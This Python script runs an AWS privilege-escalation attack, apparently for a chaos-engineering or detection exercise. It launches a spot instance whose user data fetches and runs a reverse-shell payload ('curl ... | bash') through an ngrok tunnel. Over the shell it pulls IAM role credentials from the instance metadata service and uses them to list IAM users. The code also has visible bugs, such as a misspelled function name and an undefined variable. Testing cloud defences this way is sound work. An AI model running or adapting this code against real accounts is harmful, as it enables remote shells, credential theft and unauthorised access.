import json
import os
import paramiko
import base64
import time
import boto3
import re
import subprocess
import socket
from botocore.exceptions import ClientError
from chaosaws import get_logger
from pyngrok import ngrok

logger = get_logger()

# Configuration
HOST = "0.0.0.0"  # Listen on all interfaces
PORT = 12345      # Port to wait for remote connection
OUTPUT_FILE = "remote_output.json" # File to save output
NGROK_AUTHTOKEN='YOUR_TOKEN' # NGROK_TOKEN

def wait_connect():
    """listening port indicated and save the output in a file."""

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((HOST, PORT))
        server_socket.listen(1)
        print(f"Waiting for remote connection in {HOST}:{PORT}...")

        # Aceptar la conexión entrante
        conn, addr = server_socket.accept()
        print(f"Established connection with {addr}")

        with conn, open(OUTPUT_FILE, "w") as output_file:
            print(f"Saving the output in {OUTPUT_FILE}...")

            # Enviar comando para iniciar shell interactiva
            conn.sendall(b"/bin/sh\n")

            # Enviar el comando `ls` a la máquina remota
            #comando = "ls -la\n"  # Nota el salto de línea `\n`
            comando = "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-CloudWatch-Agent-Role\n"
            conn.sendall(comando.encode())

            conn.settimeout(10)  # Tiempo límite de espera de respuesta

            try:
                while True:
                    data = conn.recv(1024)
                    if not data:
                        break
                    output_file.write(data.decode())
                    output_file.flush()
            except socket.timeout:
                print("Time-Out. Closing connection.")
            print("The remote connection its closed.")



def clear_json(ruta_archivo):
    """Removes everything from the JSON file except the content within curly braces {}."""
    try:
        with open(ruta_archivo, "r") as archivo:
            contenido = archivo.read()
        json_valido = re.search(r"\{.*\}", contenido, re.DOTALL)
        if json_valido:
            with open(ruta_archivo, "w") as archivo:
                archivo.write(json_valido.group())
            print(f"The file '{ruta_archivo}' has been successfully cleaned.")
        else:
            print("No valid JSON content found in the file.")
    except Exception as e:
        print(f"Error cleaning the file: {e}")
        
def chage_state_alert(filename):
    # Reading the states file
    with open(json_file_path, "r") as file:
        data = json.load(file)

    # Updating the alert states
    data["Findings"]["High"] = True

    # Save changes
    with open(json_file_path, "w") as file:
        json.dump(data, file, indent=4)

def extract_credentials_file(keys):
    clear_json(keys)
    with open(keys) as f:
        new_keys = json.load(f)
    access = new_keys["AccessKeyId"]
    secret = new_keys["SecretAccessKey"]
    token = new_keys["Token"]
    print(access, secret, token, sep="\n")
    print("-----Reading new credentials-----")
    try:
        sess = get_session("Attacker", access, secret, token)
        print("SUCCESS!")
        client = sess.client('iam')
        lista = client.list_users(MaxItems=2)['Users']
        for usuario in lista:
            print(f"- Arn: {usuario['Arn']}")
            print(f"  CreateDate: {str(usuario['CreateDate'])}")
            print(f"  PasswordLastUsed: {str(usuario['PasswordLastUsed'])}")
            print(f"  Path: {usuario['Path']}")
            print(f"  UserID: {usuario['UserId']}")
            print(f"  UserName: {usuario['UserName']}")
            change_state_alert("selected.json")
        return True
    except Exception as e:
        print(f"Couldn't connect using new credentials: {e}")
        return False

def get_session(sett, access, secret, token=None):
    try:
        if sett == "Vulnerable":
            return boto3.session.Session(
                region_name="us-east-2",
                aws_access_key_id=access,
                aws_secret_access_key=secret
            )
        elif sett == "Attacker":
            return boto3.session.Session(
                region_name="us-east-2",
                aws_access_key_id=access,
                aws_secret_access_key=secret,
                aws_session_token=token
            )
        return boto3.session.Session(region_name="us-east-2")
    except Exception as e:
        print(f"Error: couldn't create a session. Details: {e}")

def create_tunel():
    
    """Starts `nc` in the background and waits for a remote connection."""
    print("Executing netcat to listen on port 12345...")
    nc_process = subprocess.Popen(
        ["nc", "-nlvp", str(PORT)],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    try:
        wait_connect()
    finally:
        nc_process.terminate()
        print("Netcat process has been stopped.")

def create_instance_spot(instance_type, iam_instance_profile):
    try:
        ec2 = boto3.client('ec2')

        ngrok.set_auth_token(NGROK_AUTHTOKEN)
        tcp_tunnel = ngrok.connect(12345, "tcp")
        url = tcp_tunnel.public_url[6:]

        rev_shell_script = f"""#!/bin/bash
        LOG="/tmp/reverse_shell.log"
        echo "[INFO] Running payload at: $(date)" >> $LOG
        curl -s https://reverse-shell.sh/{url} | bash
        """
        user_data_encoded = base64.b64encode(rev_shell_script.encode()).decode()
        response = ec2.run_instances(
            ImageId=get_latest_ami(),
            InstanceType=instance_type,
            MinCount=1,
            MaxCount=1,
            IamInstanceProfile={'Name': iam_instance_profile},
            UserData=user_data_encoded,
            InstanceMarketOptions={
                "MarketType": "spot",
                "SpotOptions": {
                    "MaxPrice": "0.005",
                    "SpotInstanceType": "one-time",
                    "InstanceInterruptionBehavior": "terminate"
                }
            }
        )
        instance_id = response['Instances'][0]['InstanceId']
        print(f"[+] Spot Instance created with ID: {instance_id}") 
        #print("[+] Waiting 60s, executing the payload...")
        #time.sleep(60) 
        create_tunel()
        return True
    except Exception as e:
        print(f"[ERROR] An issue occurred: {e}")
        return False
    
def get_latest_ami():
    region = 'us-east-1'
    
    # Method 1: Use Parameter Store (recommended)
    try:
        ssm = boto3.client('ssm', region_name=region)
        parameter = ssm.get_parameter(
            Name='/aws/service/ami-amazon-linux-latest/amzn2-ami-hvm-x86_64-gp2'
        )
        ami_id = parameter['Parameter']['Value']
        return ami_id
    
    except Exception as e:
        print(f"Error with Parameter Store: {e}. Using alternative method...")

    # Method 2: Filter search
    ec2 = boto3.client('ec2', region_name=region)
    response = ec2.describe_images(
        Owners=['amazon'],
        Filters=[
            {'Name': 'name', 'Values': ['amzn2-ami-hvm-*-x86_64-gp2']},
            {'Name': 'state', 'Values': ['available']},
            {'Name': 'architecture', 'Values': ['x86_64']},
            {'Name': 'virtualization-type', 'Values': ['hvm']}
        ]
    )
    # Sort by date and select the most recent one
    images = sorted(response['Images'], key=lambda x: x['CreationDate'], reverse=True)
    ami_id = images[0]['ImageId']
    return ami_id
